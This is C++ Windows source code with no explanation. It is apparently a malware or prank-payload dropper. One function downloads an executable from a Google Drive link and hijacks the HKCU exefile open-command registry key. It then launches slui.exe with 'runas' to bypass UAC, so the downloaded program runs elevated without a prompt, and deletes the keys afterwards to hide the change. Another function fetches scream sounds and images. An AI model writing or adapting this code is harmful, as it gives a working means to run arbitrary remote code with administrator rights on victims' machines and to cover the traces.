#pragma comment(lib, "urlmon.lib")
#include <Windows.h>
#include <string>
using namespace std;

void CRK(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}
void DRK(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
void SRV(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}

int Admin() {
	const wchar_t* dwnld_URL = L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z";
	const wchar_t* savepath = L"C:\\Users\\Public\\Downloads\\Flopa.exe";
	URLDownloadToFile(NULL, dwnld_URL, savepath, 0, NULL);

	CRK(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");

	SRV(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Users\\Public\\Downloads\\Flopa.exe");
	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);

	Sleep(1000);

	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	return 0;
}

int Download() {
	const wchar_t* dwnld_URL1 = L"https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J";
	const wchar_t* savepath1 = L"C:\\Users\\Public\\Downloads\\BG.wav";
	URLDownloadToFile(NULL, dwnld_URL1, savepath1, 0, NULL);

	const wchar_t* dwnld_URL2 = L"https://drive.google.com/uc?export=download&id=1QSB8qiO7UNal3DRVcNksGqt7blJvfO7d";
	const wchar_t* savepath2 = L"C:\\Users\\Public\\Downloads\\WP.bmp";
	URLDownloadToFile(NULL, dwnld_URL2, savepath2, 0, NULL);

	const wchar_t* dwnld_URL3 = L"https://drive.google.com/uc?export=download&id=10uFLkcXovBrfUsKFv5aibp--y82cPGMi";
	const wchar_t* savepath3 = L"C:\\Users\\Public\\Downloads\\scream.wav";
	URLDownloadToFile(NULL, dwnld_URL3, savepath3, 0, NULL);

	const wchar_t* dwnld_URL4 = L"https://drive.google.com/uc?export=download&id=1NHPXcHardB10CLDIykeX3T758WyJc5zi";
	const wchar_t* savepath4 = L"C:\\Users\\Public\\Downloads\\screamBG.bmp";
	URLDownloadToFile(NULL, dwnld_URL4, savepath4, 0, NULL);
	return 0;
}
